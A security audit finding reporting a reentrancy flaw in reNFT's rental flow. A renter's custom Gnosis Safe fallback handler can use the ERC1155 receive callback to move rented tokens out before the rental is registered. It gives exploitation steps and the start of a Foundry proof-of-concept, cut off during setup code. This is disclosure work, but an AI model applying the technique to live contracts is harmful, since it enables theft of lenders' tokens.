[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation
Submitted bysin1st3r__, also found byBeepidibopandhash
Pre-requisite knowledge & an overview of the features in question

Gnosis safe fallback handlers: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says “If I see something unknown, then I just let the fallback handler deal with it.”Example: If you want to take a uniswap flash loan using your gnosis safe, you’ll have to create a fallback handler contract with the callback functionuniswapV2Call(). When you decide to take a flash loan using your safe, you’ll send a call toswap()in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to calluniswapV2Call(), butuniswapV2Call()isn’t actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe’s fallback handler and ask it to handle theuniswapV2Call()TX coming from uniswap.Setting a fallback handler: To set a fallback handler for your safe, you’ll have to call the functionsetFallbackHandler()which you can find it’s logic inFallbackManager.sol

The Vulnerability

In order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.
Step 1: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).
Step 2: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender’s NFT tokens to the borrower’s gnosis rental safe, then it transfers the borrower’s ERC20 tokens to the Payment Escrow.
Note 1: Keep in mind that the rental is not registered yet..
Note 2: The Seaport Conduit utilizes thesafeTransferFromfunction to transfer the ERC1155 tokens which will triggeronERC1155Receivehook on the receiver of the ERC1155 tokens, in this case, it’s the borrower’s rental safe. However, when it comes to the transferral of ERC721 tokens, it usestransferFromand notsafeTransferFrom.
Step 3: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport isCreate.soland the callback function it is holding, which as I mentioned, will be called by Seaport, isvalidateOrder().
Step 4: Once thevalidateOrder()function is called, the rental registeration process will kick in. A series of internal functions will be called insideCreate.solwhich will verify the signatures of the order data it has received from seaport and then the internal function_rentFromZonewill be called and this internal function will actually register the rental. It’ll communicate with theStoragemodule which holds all the rental data and ask it toadd the rental.
Step 5: The rental is finally added.
Here is the full execution flow.
Note: to view the provided image, please see the original submissionhere.

The vulnerability

The main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition tosafeTransferFrom()being used to transfer ERC1155 tokens, which would of course, trigger the callback functiononERC1155Receive()on the borrower’s safe.
The combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.
Steps of exploitation

The attacker will create a custom fallback handler contract which will contain an implementation of theonERC1155Receive()function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender’s NFT tokens to the borrower’s safe. The implementation of theonERC1155Receive()function will simply instruct the gnosis safe to transfer the tokens to the attacker’s address.Since the rental is not yet registered, the guard will let the transferral occur normallyThe attacker will create the rental safe which he’ll utilize to hijack the target ERC1155 token.The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.The attacker will initiate the rental processWhen the conduit transfers the lender’s ERC1155 token to the attacker’s safe usingsafeTransferFrom. It’ll request to callonERC1155Receive()on the attacker’s safe, but theonERC1155Receive()callback function isn’t implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and theonERC1155Receive()function in the fallback handler will be executed.When theonERC1155Receive()callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker’s address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn’t aware of the rental at this point.The ERC1155 token will be hijacked successfully.

Proof of concept

To run the PoC, you’ll need to do the following:
You’ll need to add the following two files to the test/ folder:SetupExploit.sol-> Sets up everything from seaport, gnosis, reNFT contractsExploit.sol-> The actual exploit PoC which relies onSetupExploit.solas a base.You’ll need to run this commandforge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv
The files:
SetupExploit.sol// SPDX-License-Identifier: BUSL-1.1pragma solidity ^0.8.20;import {ConsiderationItem,OfferItem,OrderParameters,OrderComponents,Order,AdvancedOrder,ItemType,ItemType as SeaportItemType,CriteriaResolver,OrderType as SeaportOrderType,Fulfillment,FulfillmentComponent} from "@seaport-types/lib/ConsiderationStructs.sol";import {AdvancedOrderLib,ConsiderationItemLib,FulfillmentComponentLib,FulfillmentLib,OfferItemLib,OrderComponentsLib,OrderLib,OrderParametersLib,SeaportArrays,ZoneParametersLib} from "@seaport-sol/SeaportSol.sol";import {OrderMetadata,OrderType,OrderFulfillment,RentPayload,RentalOrder,Item,SettleTo,ItemType as RentalItemType} from "@src/libraries/RentalStructs.sol";import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";import {OrderMetadata, OrderType, Hook} from "@src/libraries/RentalStructs.sol";import {Vm} from "@forge-std/Vm.sol";import {Assertions} from "@test/utils/Assertions.sol";import {Constants} from "@test/utils/Constants.sol";import {LibString} from "@solady/utils/LibString.sol";import {SafeL2} from "@safe-contracts/SafeL2.sol";import {BaseExternal} from "@test/fixtures/external/BaseExternal.sol";import {Create2Deployer} from "@src/Create2Deployer.sol";import {Kernel, Actions} from "@src/Kernel.sol";import {Storage} from "@src/modules/Storage.sol";import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";import {Create} from "@src/policies/Create.sol";import {Stop} from "@src/policies/Stop.sol";import {Factory} from "@src/policies/Factory.sol";import {Admin} from "@src/policies/Admin.sol";import {Guard} from "@src/policies/Guard.sol";import {toRole} from "@src/libraries/KernelUtils.sol";import {Proxy} from "@src/proxy/Proxy.sol";import {Events} from "@src/libraries/Events.sol";import {ProtocolAccount} from "@test/utils/Types.sol";import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";import {MockERC721} from "@test/mocks/tokens/standard/MockERC721.sol";import {MockERC1155} from "@test/mocks/tokens/standard/MockERC1155.sol";import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";import {Enum} from "@safe-contracts/common/Enum.sol";import {ISafe} from "@src/interfaces/ISafe.sol";// Deploys all V3 protocol contractscontract Protocol is BaseExternal {// KernelKernel public kernel;// ModulesStorage public STORE;PaymentEscrow public ESCRW;// Module implementation addressesStorage public storageImplementation;PaymentEscrow public paymentEscrowImplementation;// PoliciesCreate public create;Stop public stop;Factory public factory;Admin public admin;Guard public guard;// Protocol accountsVm.Wallet public rentalSigner;Vm.Wallet public deployer;// protocol constantsbytes12 public protocolVersion;bytes32 public salt;function _deployKernel() internal {// abi encode the kernel bytecode and constructor argumentsbytes memory kernelInitCode = abi.encodePacked(type(Kernel).creationCode,abi.encode(deployer.addr, deployer.addr));// Deploy kernel contractvm.prank(deployer.addr);kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));// label the contractvm.label(address(kernel), "kernel");}function _deployStorageModule() internal {// abi encode the storage bytecode and constructor arguments// for the implementation contractbytes memory storageImplementationInitCode = abi.encodePacked(type(Storage).creationCode,abi.encode(address(0)));// Deploy storage implementation contractvm.prank(deployer.addr);storageImplementation = Storage(create2Deployer.deploy(salt, storageImplementationInitCode));// abi encode the storage bytecode and initialization arguments// for the proxy contractbytes memory storageProxyInitCode = abi.encodePacked(type(Proxy).creationCode,abi.encode(address(storageImplementation),abi.encodeWithSelector(Storage.MODULE_PROXY_INSTANTIATION.selector,address(kernel))));// Deploy storage proxy contractvm.prank(deployer.addr);STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));// label the contractsvm.label(address(STORE), "STORE");vm.label(address(storageImplementation), "STORE_IMPLEMENTATION");}function _deployPaymentEscrowModule() internal {// abi encode the payment escrow bytecode and constructor arguments// for the implementation contractbytes memory paymentEscrowImplementationInitCode = abi.encodePacked(type(PaymentEscrow).creationCode,abi.encode(address(0)));// Deploy payment escrow implementation contractvm.prank(deployer.addr);paymentEscrowImplementation = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowImplementationInitCode));// abi encode the payment escrow bytecode and initialization arguments// for the proxy contractbytes memory paymentEscrowProxyInitCode = abi.encodePacked(type(Proxy).creationCode,abi.encode(address(paymentEscrowImplementation),abi.encodeWithSelector(PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,address(kernel))));// Deploy payment escrow contractvm.prank(deployer.addr);ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));// label the contractsvm.label(address(ESCRW), "ESCRW");vm.label(address(paymentEscrowImplementation), "ESCRW_IMPLEMENTATION");}function _deployCreatePolicy() internal {// abi encode the create policy bytecode and constructor argumentsbytes memory createInitCode = abi.encodePacked(type(Create).creationCode,abi.encode(address(kernel)));// Deploy create rental policy contractvm.prank(deployer.addr);create = Create(create2Deployer.deploy(salt, createInitCode));// label the contractvm.label(address(create), "CreatePolicy");}function _deployStopPolicy() internal {// abi encode the stop policy bytecode and constructor argumentsbytes memory stopInitCode = abi.encodePacked(type(Stop).creationCode,abi.encode(address(kernel)));// Deploy stop rental policy contractvm.prank(deployer.addr);stop = Stop(create2Deployer.deploy(salt, stopInitCode));// label the contractvm.label(address(stop), "StopPolicy");}function _deployAdminPolicy() internal {// abi encode the admin policy bytecode and constructor argumentsbytes memory adminInitCode = abi.encodePacked(type(Admin).creationCode,abi.encode(address(kernel)));// Deploy admin policy contractvm.prank(deployer.addr);admin = Admin(create2Deployer.deploy(salt, adminInitCode));// label the contractvm.label(address(admin), "AdminPolicy");}function _deployGuardPolicy() internal {// abi encode the guard policy bytecode and constructor argumentsbytes memory guardInitCode = abi.encodePacked(type(Guard).creationCode,abi.encode(address(kernel)));// Deploy guard policy contractvm.prank(deployer.addr);guard = Guard(create2Deployer.deploy(salt, guardInitCode));// label the contractvm.label(address(guard), "GuardPolicy");}function _deployFactoryPolicy() internal {// abi encode the factory policy bytecode and constructor argumentsbytes memory factoryInitCode = abi.encodePacked(type(Factory).creationCode,abi.encode(address(kernel),address(stop),address(guard),address(tokenCallbackHandler),address(safeProxyFactory),address(safeSingleton)));// Deploy factory policy contractvm.prank(deployer.addr);factory = Factory(create2Deployer.deploy(salt, factoryInitCode));// label the contractvm.label(address(factory), "FactoryPolicy");}function _setupKernel() internal {// Start impersonating the deployervm.startPrank(deployer.addr);// Install moduleskernel.executeAction(Actions.InstallModule, address(STORE));kernel.executeAction(Actions.InstallModule, address(ESCRW));// Approve policieskernel.executeAction(Actions.ActivatePolicy, address(create));kernel.executeAction(Actions.ActivatePolicy, address(stop));kernel.executeAction(Actions.ActivatePolicy, address(factory));kernel.executeAction(Actions.ActivatePolicy, address(guard));kernel.executeAction(Actions.ActivatePolicy, address(admin));// Grant `seaport` role to seaport protocolkernel.grantRole(toRole("SEAPORT"), address(seaport));// Grant `signer` role to the protocol signer to sign off on create payloadskernel.grantRole(toRole("CREATE_SIGNER"), rentalSigner.addr);// Grant 'admin_admin` role to the address which can conduct admin operations on the protocolkernel.grantRole(toRole("ADMIN_ADMIN"), deployer.addr);// Grant 'guard_admin` role to the address which can toggle hookskernel.grantRole(toRole("GUARD_ADMIN"), deployer.addr);// Grant `stop_admin` role to the address which can skim funds from the payment escrowkernel.grantRole(toRole("STOP_ADMIN"), deployer.addr);// Stop impersonating the deployervm.stopPrank();}function setUp() public virtual override {// setup dependenciessuper.setUp();// create the rental signer address and private keyrentalSigner = vm.createWallet("rentalSigner");// create the deployer address and private keydeployer = vm.createWallet("deployer");// contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)protocolVersion = 0x000000000000000000000100;salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);// deploy kernel_deployKernel();// Deploy payment escrow_deployPaymentEscrowModule();// Deploy rental storage_deployStorageModule();// deploy create policy_deployCreatePolicy();// deploy stop policy_deployStopPolicy();// deploy admin policy_deployAdminPolicy();// Deploy guard policy_deployGuardPolicy();// deploy rental factory_deployFactoryPolicy();// intialize the kernel_setupKernel();}}// Creates test accounts to interact with the V3 protocol// Borrowed from test/fixtures/protocol/AccountCreatorcontract AccountCreator is Protocol {// Protocol accounts for testingProtocolAccount public alice;ProtocolAccount public bob;ProtocolAccount public carol;ProtocolAccount public dan;ProtocolAccount public eve;ProtocolAccount public attacker;// Mock tokens for testingMockERC20[] public erc20s;MockERC721[] public erc721s;MockERC1155[] public erc1155s;function setUp() public virtual override {super.setUp();// deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens_deployTokens(3);// instantiate all wallets and deploy rental safes for eachalice = _fundWalletAndDeployRentalSafe("alice");bob = _fundWalletAndDeployRentalSafe("bob");carol = _fundWalletAndDeployRentalSafe("carol");dan = _fundWalletAndDeployRentalSafe("dan");eve = _fundWalletAndDeployRentalSafe("eve");attacker = _fundWalletAndDeployRentalSafe("attacker");}function _deployTokens(uint256 numTokens) internal {for (uint256 i; i < numTokens; i++) {_deployErc20Token();_deployErc721Token();_deployErc1155Token();}}function _deployErc20Token() internal returns (uint256 i) {// save the token's indexi = erc20s.length;// deploy the mock tokenMockERC20 token = new MockERC20();// push the token to the array of mockserc20s.push(token);// set the token label with the indexvm.label(address(token), string.concat("MERC20_", LibString.toString(i)));}function _deployErc721Token() internal returns (uint256 i) {// save the token's indexi = erc721s.length;// deploy the mock tokenMockERC721 token = new MockERC721();// push the token to the array of mockserc721s.push(token);// set the token label with the indexvm.label(address(token), string.concat("MERC721_", LibString.toString(i)));}function _deployErc1155Token() internal returns (uint256 i) {// save the token's indexi = erc1155s.length;// deploy the mock tokenMockERC1155 token = new MockERC1155();// push the token to the array of mockserc1155s.push(token);// set the token label with the indexvm.label(address(token), string.concat("MERC1155_", LibString.toString(i)));}function _deployRentalSafe(address owner,string memory name) internal returns (address safe) {// Deploy a 1/1 rental safeaddress[] memory owners = new address[](1);owners[0] = owner;safe = factory.deployRentalSafe(owners, 1);}function _fundWalletAndDeployRentalSafe(string memory name) internal returns (ProtocolAccount memory account) {// create a wallet with a address, public key, and private keyVm.Wallet memory wallet = vm.createWallet(name);// deploy a rental safe for the addressaddress rentalSafe = _deployRentalSafe(wallet.addr, name);// fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s_allocateTokensAndApprovals(wallet.addr, 10000);// create an accountaccount = ProtocolAccount({addr: wallet.addr,safe: SafeL2(payable(rentalSafe)),publicKeyX: wallet.publicKeyX,publicKeyY: wallet.publicKeyY,privateKey: wallet.privateKey});}function _allocateTokensAndApprovals(address to, uint128 amount) internal {// deal ether to the recipientvm.deal(to, amount);// mint all erc20 tokens to the recipientfor (uint256 i = 0; i < erc20s.length; ++i) {erc20s[i].mint(to, amount);}// set token approvals_setApprovals(to);}function _setApprovals(address owner) internal {// impersonate the owner addressvm.startPrank(owner);// set all approvals for erc20 tokensfor (uint256 i = 0; i < erc20s.length; ++i) {erc20s[i].approve(address(conduit), type(uint256).max);}// set all approvals for erc721 tokensfor (uint256 i = 0; i < erc721s.length; ++i) {erc721s[i].setApprovalForAll(address(conduit), true);}// set all approvals for erc1155 tokensfor (uint256 i = 0; i < erc1155s.length; ++i) {erc1155s[i].setApprovalForAll(address(conduit), true);}// stop impersonatingvm.stopPrank();}}interface ERC1155TokenReceiver {function onERC1155Received(address _operator,address _from,uint256 _id,uint256 _value,bytes calldata _data) external returns (bytes4);function onERC1155BatchReceived(address _operator,address _from,uint256[] calldata _ids,uint256[] calldata _values,bytes calldata _data) external returns (bytes4);}interface ERC721TokenReceiver {function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);}interface IERC165 {function supportsInterface(bytes4 interfaceId) external view returns (bool);}/*** Borrowed from gnosis safe smart contracts* @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.* @author Richard Meissner - @rmeissner*/contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {/*** @notice Handles ERC1155 Token callback.* return Standardized onERC1155Received return value.*/function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {return 0xf23a6e61;}/*** @notice Handles ERC1155 Token batch callback.* return Standardized onERC1155BatchReceived return value.*/function onERC1155BatchReceived(address,address,uint256[] calldata,uint256[] calldata,bytes calldata) external pure override returns (bytes4) {return 0xbc197c81;}/*** @notice Handles ERC721 Token callback.*  return Standardized onERC721Received return value.*/function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {return 0x150b7a02;}/*** @notice Handles ERC777 Token callback.* return nothing (not standardized)*/function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {// We implement this for completeness, doesn't really have any value}/*** @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.* @param interfaceId Id of the interface.* @return if the interface is supported.*/function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {returninterfaceId == type(ERC1155TokenReceiver).interfaceId ||interfaceId == type(ERC721TokenReceiver).interfaceId ||interfaceId == type(IERC165).interfaceId;}}// Sets up logic in the test engine related to order creation// Borrowed from test/fixtures/engine/OrderCreatorcontract OrderCreator is AccountCreator {using OfferItemLib for OfferItem;using ConsiderationItemLib for ConsiderationItem;using OrderComponentsLib for OrderComponents;using OrderLib for Order;using ECDSA for bytes32;// defines a config for a standard order componentstring constant STANDARD_ORDER_COMPONENTS = "standard_order_components";struct OrderToCreate {ProtocolAccount offerer;OfferItem[] offerItems;ConsiderationItem[] considerationItems;OrderMetadata metadata;}// keeps track of tokens used during a testuint256[] usedOfferERC721s;uint256[] usedOfferERC1155s;uint256[] usedConsiderationERC721s;uint256[] usedConsiderationERC1155s;// components of an orderOrderToCreate orderToCreate;function setUp() public virtual override {super.setUp();// Define a standard OrderComponents struct which is ready for// use with the Create Policy and the protocol conduit contractOrderComponentsLib.empty().withOrderType(SeaportOrderType.FULL_RESTRICTED).withZone(address(create)).withStartTime(block.timestamp).withEndTime(block.timestamp + 100).withSalt(123456789).withConduitKey(conduitKey).saveDefault(STANDARD_ORDER_COMPONENTS);// for each test token, create a storage slotfor (uint256 i = 0; i < erc721s.length; i++) {usedOfferERC721s.push();usedConsiderationERC721s.push();usedOfferERC1155s.push();usedConsiderationERC1155s.push();}}///////////////////////////////////////////////////////////////////////////////////                                Order Creation                               ///////////////////////////////////////////////////////////////////////////////////// creates an order based on the provided context. The defaults on this order// are good for most test cases.function createOrder(ProtocolAccount memory offerer,OrderType orderType,uint256 erc721Offers,uint256 erc1155Offers,uint256 erc20Offers,uint256 erc721Considerations,uint256 erc1155Considerations,uint256 erc20Considerations) internal {// require that the number of offer items or consideration items// dont exceed the number of test tokensrequire(erc721Offers <= erc721s.length &&erc721Offers <= erc1155s.length &&erc20Offers <= erc20s.length,"TEST: too many offer items defined");require(erc721Considerations <= erc721s.length &&erc1155Considerations <= erc1155s.length &&erc20Considerations <= erc20s.length,"TEST: too many consideration items defined");// create the offerer_createOfferer(offerer);// add the offer items_createOfferItems(erc721Offers, erc1155Offers, erc20Offers);// create the consideration items_createConsiderationItems(erc721Considerations,erc1155Considerations,erc20Considerations);// Create order metadata_createOrderMetadata(orderType);}// Creates an offerer on the order to createfunction _createOfferer(ProtocolAccount memory offerer) private {orderToCreate.offerer = offerer;}// Creates offer items which are good for most testsfunction _createOfferItems(uint256 erc721Offers,uint256 erc1155Offers,uint256 erc20Offers) private {// generate the ERC721 offer itemsfor (uint256 i = 0; i < erc721Offers; ++i) {// create the offer itemorderToCreate.offerItems.push(OfferItemLib.empty().withItemType(ItemType.ERC721).withToken(address(erc721s[i])).withIdentifierOrCriteria(usedOfferERC721s[i]).withStartAmount(1).withEndAmount(1));// mint an erc721 to the offerererc721s[i].mint(orderToCreate.offerer.addr);// update the used token so it cannot be used again in the same testusedOfferERC721s[i]++;}// generate the ERC1155 offer itemsfor (uint256 i = 0; i < erc1155Offers; ++i) {// create the offer itemorderToCreate.offerItems.push(OfferItemLib.empty().withItemType(ItemType.ERC1155).withToken(address(erc1155s[i])).withIdentifierOrCriteria(usedOfferERC1155s[i]).withStartAmount(100).withEndAmount(100));// mint an erc1155 to the offerererc1155s[i].mint(orderToCreate.offerer.addr, 100);// update the used token so it cannot be used again in the same testusedOfferERC1155s[i]++;}// generate the ERC20 offer itemsfor (uint256 i = 0; i < erc20Offers; ++i) {// create the offer itemorderToCreate.offerItems.push(OfferItemLib.empty().withItemType(ItemType.ERC20).withToken(address(erc20s[i])).withStartAmount(100).withEndAmount(100));}}// Creates consideration items that are good for most testsfunction _createConsiderationItems(uint256 erc721Considerations,uint256 erc1155Considerations,uint256 erc20Considerations) private {// generate the ERC721 consideration itemsfor (uint256 i = 0; i < erc721Considerations; ++i) {// create the consideration item, and set the recipient as the offerer's// rental safe addressorderToCreate.considerationItems.push(ConsiderationItemLib.empty().withRecipient(address(orderToCreate.offerer.safe)).withItemType(ItemType.ERC721).withToken(address(erc721s[i])).withIdentifierOrCriteria(usedConsiderationERC721s[i]).withStartAmount(1).withEndAmount(1));// update the used token so it cannot be used again in the same testusedConsiderationERC721s[i]++;}// generate the ERC1155 consideration itemsfor (uint256 i = 0; i < erc1155Considerations; ++i) {// create the consideration item, and set the recipient as the offerer's// rental safe addressorderToCreate.considerationItems.push(ConsiderationItemLib.empty().withRecipient(address(orderToCreate.offerer.safe)).withItemType(ItemType.ERC1155).withToken(address(erc1155s[i])).withIdentifierOrCriteria(usedConsiderationERC1155s[i]).withStartAmount(100).withEndAmount(100));// update the used token so it cannot be used again in the same testusedConsiderationERC1155s[i]++;}// generate the ERC20 consideration itemsfor (uint256 i = 0; i < erc20Considerations; ++i) {// create the offer itemorderToCreate.considerationItems.push(ConsiderationItemLib.empty().withRecipient(address(ESCRW)).withItemType(ItemType.ERC20).withToken(address(erc20s[i])).withStartAmount(100).withEndAmount(100));}}// Creates a order metadata that is good for most testsfunction _createOrderMetadata(OrderType orderType) private {// Create order metadataorderToCreate.metadata.orderType = orderType;orderToCreate.metadata.rentDuration = 500;orderToCreate.metadata.emittedExtraData = new bytes(0);}// creates a signed seaport order ready to be fulfilled by a renterfunction _createSignedOrder(ProtocolAccount memory _offerer,OfferItem[] memory _offerItems,ConsiderationItem[] memory _considerationItems,OrderMetadata memory _metadata) private view returns (Order memory order, bytes32 orderHash) {// Build the order componentsOrderComponents memory orderComponents = OrderComponentsLib.fromDefault(STANDARD_ORDER_COMPONENTS).withOfferer(_offerer.addr).withOffer(_offerItems).withConsideration(_considerationItems).withZoneHash(create.getOrderMetadataHash(_metadata)).withCounter(seaport.getCounter(_offerer.addr));// generate the order hashorderHash = seaport.getOrderHash(orderComponents);// generate the signature for the order componentsbytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);// create the order, but dont provide a signature if its a PAYEE order.// Since PAYEE orders are fulfilled by the offerer of the order, they// dont need a signature.if (_metadata.orderType == OrderType.PAYEE) {order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());} else {order = OrderLib.empty().withParameters(orderComponents.toOrderParameters()).withSignature(signature);}}function _signSeaportOrder(uint256 signerPrivateKey,bytes32 orderHash) private view returns (bytes memory signature) {// fetch domain separator from seaport(, bytes32 domainSeparator, ) = seaport.information();// sign the EIP-712 digest(uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey,domainSeparator.toTypedDataHash(orderHash));// encode the signaturesignature = abi.encodePacked(r, s, v);}///////////////////////////////////////////////////////////////////////////////////                               Order Amendments                              ///////////////////////////////////////////////////////////////////////////////////function resetOrderToCreate() internal {delete orderToCreate;}function withOfferer(ProtocolAccount memory _offerer) internal {orderToCreate.offerer = _offerer;}function resetOfferer() internal {delete orderToCreate.offerer;}function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {// reset all current offer itemsresetOfferItems();// add the new offer items to storagefor (uint256 i = 0; i < _offerItems.length; i++) {orderToCreate.offerItems.push(_offerItems[i]);}}function withOfferItem(OfferItem memory offerItem) internal {orderToCreate.offerItems.push(offerItem);}function resetOfferItems() internal {delete orderToCreate.offerItems;}function popOfferItem() internal {orderToCreate.offerItems.pop();}function withReplacedConsiderationItems(ConsiderationItem[] memory _considerationItems) internal {// reset all current consideration itemsresetConsiderationItems();// add the new consideration items to storagefor (uint256 i = 0; i < _considerationItems.length; i++) {orderToCreate.considerationItems.push(_considerationItems[i]);}}function withConsiderationItem(ConsiderationItem memory considerationItem) internal {orderToCreate.considerationItems.push(considerationItem);}function resetConsiderationItems() internal {delete orderToCreate.considerationItems;}function popConsiderationItem() internal {orderToCreate.considerationItems.pop();}function withHooks(Hook[] memory hooks) internal {// delete the current metatdata hooksdelete orderToCreate.metadata.hooks;// add each metadata hook to storagefor (uint256 i = 0; i < hooks.length; i++) {orderToCreate.metadata.hooks.push(hooks[i]);}}function withOrderMetadata(OrderMetadata memory _metadata) internal {// update the static metadata parametersorderToCreate.metadata.orderType = _metadata.orderType;orderToCreate.metadata.rentDuration = _metadata.rentDuration;orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;// update the hookswithHooks(_metadata.hooks);}function resetOrderMetadata() internal {delete orderToCreate.metadata;}///////////////////////////////////////////////////////////////////////////////////                              Order Finalization                             ///////////////////////////////////////////////////////////////////////////////////function finalizeOrder()internalreturns (Order memory, bytes32, OrderMetadata memory){// create and sign the order(Order memory order, bytes32 orderHash) = _createSignedOrder(orderToCreate.offerer,orderToCreate.offerItems,orderToCreate.considerationItems,orderToCreate.metadata);// pull order metadata into memoryOrderMetadata memory metadata = orderToCreate.metadata;// clear structsresetOrderToCreate();return (order, orderHash, metadata);}}// Sets up logic in the test engine related to order fulfillment// Borrowed from test/fixtures/engine/OrderFulfillercontract OrderFulfiller is OrderCreator {using ECDSA for bytes32;struct OrderToFulfill {bytes32 orderHash;RentPayload payload;AdvancedOrder advancedOrder;}// components of a fulfillmentProtocolAccount fulfiller;OrderToFulfill[] ordersToFulfill;Fulfillment[] seaportMatchOrderFulfillments;FulfillmentComponent[][] seaportOfferFulfillments;FulfillmentComponent[][] seaportConsiderationFulfillments;address seaportRecipient;///////////////////////////////////////////////////////////////////////////////////                             Fulfillment Creation                            ///////////////////////////////////////////////////////////////////////////////////// creates an order fulfillmentfunction createOrderFulfillment(ProtocolAccount memory _fulfiller,Order memory order,bytes32 orderHash,OrderMetadata memory metadata) internal {// set the fulfiller accountfulfiller = _fulfiller;// set the recipient of any offer items after an order is fulfilled. If the fulfillment is via// `matchAdvancedOrders`, then any unspent offer items will go to this address as wellseaportRecipient = address(_fulfiller.safe);// get a pointer to a new order to fulfillOrderToFulfill storage orderToFulfill = ordersToFulfill.push();// create an order fulfillmentOrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));// add the order hash and fulfillerorderToFulfill.orderHash = orderHash;// create rental zone payload data_createRentalPayload(orderToFulfill.payload,RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr));// generate the signature for the payloadbytes memory signature = _signProtocolOrder(rentalSigner.privateKey,create.getRentPayloadHash(orderToFulfill.payload));// create an advanced order from the order. Pass the rental// payload as extra data_createAdvancedOrder(orderToFulfill.advancedOrder,AdvancedOrder(order.parameters,1,1,order.signature,abi.encode(orderToFulfill.payload, signature)));}function _createOrderFulfiller(ProtocolAccount storage storageFulfiller,ProtocolAccount memory _fulfiller) private {storageFulfiller.addr = _fulfiller.addr;storageFulfiller.safe = _fulfiller.safe;storageFulfiller.publicKeyX = _fulfiller.publicKeyX;storageFulfiller.publicKeyY = _fulfiller.publicKeyY;storageFulfiller.privateKey = _fulfiller.privateKey;}function _createOrderFulfillment(OrderFulfillment storage storageFulfillment,OrderFulfillment memory fulfillment) private {storageFulfillment.recipient = fulfillment.recipient;}function _createOrderMetadata(OrderMetadata storage storageMetadata,OrderMetadata memory metadata) private {// Create order metadata in storagestorageMetadata.orderType = metadata.orderType;storageMetadata.rentDuration = metadata.rentDuration;storageMetadata.emittedExtraData = metadata.emittedExtraData;// dynamically push the hooks from memory to storagefor (uint256 i = 0; i < metadata.hooks.length; i++) {storageMetadata.hooks.push(metadata.hooks[i]);}}function _createRentalPayload(RentPayload storage storagePayload,RentPayload memory payload) private {// set payload fulfillment on the order to fulfill_createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);// set payload metadata on the order to fulfill_createOrderMetadata(storagePayload.metadata, payload.metadata);// set payload expiration on the order to fulfillstoragePayload.expiration = payload.expiration;// set payload intended fulfiller on the order to fulfillstoragePayload.intendedFulfiller = payload.intendedFulfiller;}function _createAdvancedOrder(AdvancedOrder storage storageAdvancedOrder,AdvancedOrder memory advancedOrder) private {// create the order parameters on the order to fulfill_createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);// create the rest of the static parameters on the order to fulfillstorageAdvancedOrder.numerator = advancedOrder.numerator;storageAdvancedOrder.denominator = advancedOrder.denominator;storageAdvancedOrder.signature = advancedOrder.signature;storageAdvancedOrder.extraData = advancedOrder.extraData;}function _createOrderParameters(OrderParameters storage storageOrderParameters,OrderParameters memory orderParameters) private {// create the static order parameters for the order to fulfillstorageOrderParameters.offerer = orderParameters.offerer;storageOrderParameters.zone = orderParameters.zone;storageOrderParameters.orderType = orderParameters.orderType;storageOrderParameters.startTime = orderParameters.startTime;storageOrderParameters.endTime = orderParameters.endTime;storageOrderParameters.zoneHash = orderParameters.zoneHash;storageOrderParameters.salt = orderParameters.salt;storageOrderParameters.conduitKey = orderParameters.conduitKey;storageOrderParameters.totalOriginalConsiderationItems = orderParameters.totalOriginalConsiderationItems;// create the dynamic order parameters for the order to fulfillfor (uint256 i = 0; i < orderParameters.offer.length; i++) {storageOrderParameters.offer.push(orderParameters.offer[i]);}for (uint256 i = 0; i < orderParameters.consideration.length; i++) {storageOrderParameters.consideration.push(orderParameters.consideration[i]);}}function 